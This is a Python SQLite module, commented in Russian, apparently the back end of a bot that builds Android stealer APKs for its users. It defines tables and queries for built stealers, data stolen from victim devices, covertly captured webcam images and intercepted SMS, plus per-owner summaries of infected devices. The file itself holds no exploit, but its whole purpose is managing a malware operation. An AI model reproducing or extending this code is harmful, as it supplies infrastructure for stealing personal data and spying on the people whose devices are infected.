import sqlite3
import json
from datetime import datetime

class Database:
    def __init__(self, db_file='users.db'):
        self.connection = sqlite3.connect(db_file, check_same_thread=False)
        self.cursor = self.connection.cursor()
        self.create_tables()
    
    def create_tables(self):
        # Пользователи бота
        self.cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            user_id INTEGER UNIQUE,
            username TEXT,
            created_at TIMESTAMP
        )
        ''')
        
        # Созданные стиллеры
        self.cursor.execute('''
        CREATE TABLE IF NOT EXISTS stealers (
            id INTEGER PRIMARY KEY,
            owner_id INTEGER,
            name TEXT,
            icon_path TEXT,
            config_path TEXT,
            apk_path TEXT,
            created_at TIMESTAMP,
            FOREIGN KEY (owner_id) REFERENCES users (id)
        )
        ''')
        
        # Собранные данные
        self.cursor.execute('''
        CREATE TABLE IF NOT EXISTS stolen_data (
            id INTEGER PRIMARY KEY,
            stealer_id INTEGER,
            device_id TEXT,
            data_type TEXT,
            content TEXT,
            created_at TIMESTAMP,
            FOREIGN KEY (stealer_id) REFERENCES stealers (id)
        )
        ''')
        
        # Веб-камеры
        self.cursor.execute('''
        CREATE TABLE IF NOT EXISTS webcams (
            id INTEGER PRIMARY KEY,
            stealer_id INTEGER,
            device_id TEXT,
            image BLOB,
            created_at TIMESTAMP
        )
        ''')
        
        # СМС
        self.cursor.execute('''
        CREATE TABLE IF NOT EXISTS sms (
            id INTEGER PRIMARY KEY,
            stealer_id INTEGER,
            device_id TEXT,
            phone_number TEXT,
            message TEXT,
            timestamp TEXT
        )
        ''')
        
        self.connection.commit()
    
    def add_user(self, user_id, username):
        self.cursor.execute('''
        INSERT OR IGNORE INTO users (user_id, username, created_at)
        VALUES (?, ?, ?)
        ''', (user_id, username, datetime.now()))
        self.connection.commit()
    
    def add_stealer(self, owner_id, name, icon_path, config_path, apk_path):
        self.cursor.execute('''
        INSERT INTO stealers (owner_id, name, icon_path, config_path, apk_path, created_at)
        VALUES (?, ?, ?, ?, ?, ?)
        ''', (owner_id, name, icon_path, config_path, apk_path, datetime.now()))
        self.connection.commit()
        return self.cursor.lastrowid
    
    def add_stolen_data(self, stealer_id, device_id, data_type, content):
        self.cursor.execute('''
        INSERT INTO stolen_data (stealer_id, device_id, data_type, content, created_at)
        VALUES (?, ?, ?, ?, ?)
        ''', (stealer_id, device_id, data_type, json.dumps(content), datetime.now()))
        self.connection.commit()
    
    def add_webcam(self, stealer_id, device_id, image_data):
        self.cursor.execute('''
        INSERT INTO webcams (stealer_id, device_id, image, created_at)
        VALUES (?, ?, ?, ?)
        ''', (stealer_id, device_id, image_data, datetime.now()))
        self.connection.commit()
    
    def add_sms(self, stealer_id, device_id, phone_number, message, timestamp):
        self.cursor.execute('''
        INSERT INTO sms (stealer_id, device_id, phone_number, message, timestamp)
        VALUES (?, ?, ?, ?, ?)
        ''', (stealer_id, device_id, phone_number, message, timestamp))
        self.connection.commit()
    
    def get_user_stealers(self, user_id):
        self.cursor.execute('''
        SELECT * FROM stealers WHERE owner_id = ?
        ''', (user_id,))
        return self.cursor.fetchall()
    
    def get_stealer_data(self, stealer_id):
        self.cursor.execute('''
        SELECT * FROM stolen_data WHERE stealer_id = ? ORDER BY created_at DESC
        ''', (stealer_id,))
        return self.cursor.fetchall()
    
    def get_webcams(self, stealer_id):
        self.cursor.execute('''
        SELECT * FROM webcams WHERE stealer_id = ? ORDER BY created_at DESC
        ''', (stealer_id,))
        return self.cursor.fetchall()
    
    def get_sms(self, stealer_id):
        self.cursor.execute('''
        SELECT * FROM sms WHERE stealer_id = ? ORDER BY timestamp DESC
        ''', (stealer_id,))
        return self.cursor.fetchall()
    
    def get_all_data_summary(self, user_id):
        self.cursor.execute('''
        SELECT 
            s.id,
            s.name,
            COUNT(DISTINCT sd.device_id) as devices,
            COUNT(sd.id) as total_items,
            MAX(sd.created_at) as last_activity
        FROM stealers s
        LEFT JOIN stolen_data sd ON s.id = sd.stealer_id
        WHERE s.owner_id = ?
        GROUP BY s.id
        ''', (user_id,))
        return self.cursor.fetchall()
